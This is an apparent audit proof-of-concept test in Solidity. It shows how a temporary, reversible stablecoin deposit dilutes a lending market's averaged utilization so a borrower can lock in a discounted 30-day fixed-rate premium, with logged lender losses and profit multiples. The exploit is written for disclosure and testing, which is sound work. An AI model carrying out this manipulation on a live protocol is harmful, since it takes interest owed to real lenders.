// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { FixedMarket } from "../../../../../contracts/cap/market/FixedMarket.sol";
import { WadRayMath } from "../../../../../contracts/utils/WadRayMath.sol";
import { CapDeployer } from "../../../../../test/shared/CapDeployer.sol";

/// @notice Round-2 port of round-1 E2 (M-2): a par, fee-less, instantly-reversible cUSD deposit
/// dilutes the time-weighted utilization the fixed-term premium is priced off. The attacker parks
/// USDC for a window, takes the maximum-term fixed loan at the diluted average, and redeems the
/// USDC in the same block.
///
/// Port notes (API only; assertions identical in meaning to round 1):
///  - `_setPrice` / production oracle instead of `MockOracle` (collateral already priced at $1)
///  - `_fundTranche` deposits AND opts in
///  - EMA weight is now `1 - retentionPerSecond^elapsed` (exponential, via rayPow) rather than a
///    linear ramp that fully settles in one period, so the round-1 numbers change.
contract R1_M2_EmaManipulation is CapDeployer {
    using WadRayMath for uint256;

    uint256 internal constant RESERVE = 2_000_000e18; // idle cUSD deposits; with CREDIT gives a 10M supply
    uint256 internal constant CREDIT = 8_000_000e18; // honest credit-backed supply -> 80% utilization (the kink)
    uint256 internal constant LOAN = 1_000_000e18;
    uint256 internal constant PARK = 10_000_000e18; // attacker's USDC parked for one window

    address internal lp = makeAddr("lp");
    address internal attacker; // the permissioned borrower, or anyone acting for them
    address internal underwriter = makeAddr("underwriter");
    FixedMarket internal market;

    function setUp() public {
        vm.warp(1_000_000);
        _deployCap();
        irm.setLiquiditySlopes(capConfig.liquiditySlopes); // base 5%, slope0 5%, slope1 10%, kink 80%
        attacker = defaultBorrower;

        (address m, address t0,) = _createFixedMarket("fixed");
        market = FixedMarket(m);
        market.setUnderwriterRate(0); // isolate the liquidity premium, the only utilization-priced leg
        market.setFixedCreditLimit(type(uint256).max);
        _fundTranche(t0, underwriter, 20_000_000e18); // $20M collateral at $1 -> $10M credit at 50% ltv

        _depositStable(lp, RESERVE);
        _mintStable(makeAddr("other-borrower"), CREDIT); // pre-existing credit-backed supply (also counts in total supply)
        // the EMA is now exponential and never fully settles in one period; let it converge to the
        // honest (8M / 10M) reading before every scenario
        skip(30 * irm.averagingPeriod());
        assertApproxEqRel(irm.averageUtilization(), 0.8e27, 1e12, "honest average utilization is at the kink");
    }

    function _borrowMaxTerm() internal returns (uint256 premium) {
        premium = _borrowMaxTerm(LOAN);
    }

    function _borrowMaxTerm(uint256 loan) internal returns (uint256 premium) {
        vm.prank(attacker);
        (uint256 id, uint256 principal) = market.borrow(attacker, loan, type(uint256).max);
        premium = market.debt(id) - principal;
    }

    function _pct(uint256 part, uint256 whole) internal pure returns (uint256 bps) {
        bps = whole == 0 ? 0 : part * 10_000 / whole;
    }

    /// @dev Pure derivation: the EMA weight `1 - r^t` with period = 1 hours, for the three holding
    /// times. The discount on the premium is (approximately) weight * (honest - fullyDiluted).
    function test_emaWeightAnalytic() public {
        uint256 period = 1 hours;
        uint256 r = 1e27 - 1e27 / period;
        assertEq(irm.retentionPerSecond(), r, "retention matches the contract");
        uint256[3] memory ts = [uint256(5 minutes), 1 hours, 1 days];
        for (uint256 i; i < 3; ++i) {
            uint256 weight = 1e27 - r.rayPow(ts[i]);
            emit log_named_uint("t (s)", ts[i]);
            emit log_named_decimal_uint("  EMA weight 1 - r^t (period = 1h)", weight, 27);
        }
        // fully diluted utilization: 8M / 20M = 40%; honest 80%
        uint256 honestU = 0.8e27;
        uint256 dilutedU = uint256(CREDIT).rayDiv(RESERVE + CREDIT + PARK);
        emit log_named_decimal_uint("honest utilization", honestU, 27);
        emit log_named_decimal_uint("fully diluted utilization", dilutedU, 27);
    }

    /// @dev At the top of the band (1 day) with the loan sized to the market: the discount scales
    /// with the loan, the cost only with the parked capital
    function test_maxWindowStillProfitableForALargerLoan() public {
        irm.setAveragingPeriod(1 days);
        skip(30 days);
        uint256 loan = 5_000_000e18;

        uint256 snap = vm.snapshotState();
        uint256 honest = _borrowMaxTerm(loan);
        vm.revertToState(snap);

        _depositStable(attacker, PARK);
        skip(1 days);
        uint256 attacked = _borrowMaxTerm(loan);
        uint256 cost = PARK * 1 days / 365 days / 10;
        emit log_named_decimal_uint("honest premium on $5M/30d", honest, 18);
        emit log_named_decimal_uint("manipulated premium", attacked, 18);
        emit log_named_decimal_uint("lenders lose", honest - attacked, 18);
        emit log_named_uint("discount (bps of honest)", _pct(honest - attacked, honest));
        emit log_named_decimal_uint("attacker cost @10% APR for 1 day on $10M", cost, 18);
        emit log_named_uint("profit multiple", (honest - attacked) / (cost == 0 ? 1 : cost));
        assertEq(attacked, honest, "profitable even at the longest permitted window");
    }

    function test_parkedDepositBuysADiscountOnTheWholeTerm() public {
        uint256 period = irm.averagingPeriod();

        // ── honest ────────────────────────────────────────────────────────────
        uint256 snap = vm.snapshotState();
        uint256 honestPremium = _borrowMaxTerm();
        vm.revertToState(snap);

        // ── manipulated: park USDC for one window, borrow, unpark ────────────
        _depositStable(attacker, PARK);
        skip(period);
        emit log_named_decimal_uint("average utilization after 1 window parked", irm.averageUtilization(), 27);
        uint256 attackedPremium = _borrowMaxTerm();
        vm.prank(attacker);
        uint256 redeemed = stablecoin.redeem(PARK, attacker, attacker);
        assertEq(redeemed, PARK, "the parked USDC comes straight back at par");

        uint256 saved = honestPremium - attackedPremium;
        // opportunity cost of PARK for `period` at a generous 10% APR
        uint256 cost = PARK * period / 365 days / 10;

        emit log_named_uint("averaging period (s)", period);
        emit log_named_decimal_uint("honest 30-day liquidity premium (cUSD)", honestPremium, 18);
        emit log_named_decimal_uint("manipulated premium (cUSD)", attackedPremium, 18);
        emit log_named_decimal_uint("lenders lose (cUSD)", saved, 18);
        emit log_named_uint("discount (bps of honest)", _pct(saved, honestPremium));
        emit log_named_decimal_uint("attacker capital cost at 10% APR (cUSD)", cost, 18);
        emit log_named_uint("profit multiple", saved / (cost == 0 ? 1 : cost));

        assertEq(attackedPremium, honestPremium, "a fully reversible deposit repriced a 30-day loan");
    }

    /// @dev Same at every point of the permitted band: 5 minutes, 1 hour (default), 1 day; the
    /// attacker holds for exactly one period in each case (as in round 1)
    function test_bandDoesNotChangeTheOutcome() public {
        uint256[3] memory periods = [uint256(5 minutes), 1 hours, 1 days];
        for (uint256 i; i < 3; ++i) {
            uint256 snap = vm.snapshotState();
            irm.setAveragingPeriod(periods[i]);
            skip(30 * periods[i]);

            uint256 inner = vm.snapshotState();
            uint256 honest = _borrowMaxTerm();
            vm.revertToState(inner);

            _depositStable(attacker, PARK);
            skip(periods[i]);
            uint256 attacked = _borrowMaxTerm();
            uint256 cost = PARK * periods[i] / 365 days / 10;
            emit log_named_uint("period", periods[i]);
            emit log_named_decimal_uint("  honest premium", honest, 18);
            emit log_named_decimal_uint("  lenders lose", honest - attacked, 18);
            emit log_named_uint("  discount (bps of honest)", _pct(honest - attacked, honest));
            emit log_named_decimal_uint("  attacker cost @10% APR", cost, 18);
            emit log_named_uint("  profit multiple", (honest - attacked) / (cost == 0 ? 1 : cost));
            vm.revertToState(snap);
        }
        assertTrue(false, "see log: profitable across the whole band");
    }

    /// @dev Round-2 addition: default 1 h period fixed, attacker holds for 5 min / 1 h / 1 day so
    /// the discount can be read against the analytic weight `1 - r^t`
    function test_holdingTimeUnderDefaultPeriod() public {
        uint256[3] memory holds = [uint256(5 minutes), 1 hours, 1 days];
        uint256 snap = vm.snapshotState();
        uint256 honest = _borrowMaxTerm();
        vm.revertToState(snap);
        emit log_named_decimal_uint("honest premium (period 1h)", honest, 18);

        for (uint256 i; i < 3; ++i) {
            uint256 inner = vm.snapshotState();
            _depositStable(attacker, PARK);
            skip(holds[i]);
            uint256 attacked = _borrowMaxTerm();
            uint256 cost = PARK * holds[i] / 365 days / 10;
            emit log_named_uint("hold (s)", holds[i]);
            emit log_named_decimal_uint("  avg utilization at borrow", irm.averageUtilization(), 27);
            emit log_named_decimal_uint("  manipulated premium", attacked, 18);
            emit log_named_uint("  discount (bps of honest)", _pct(honest - attacked, honest));
            emit log_named_decimal_uint("  attacker cost @10% APR", cost, 18);
            emit log_named_uint("  profit multiple", (honest - attacked) / (cost == 0 ? 1 : cost));
            vm.revertToState(inner);
        }
    }
}
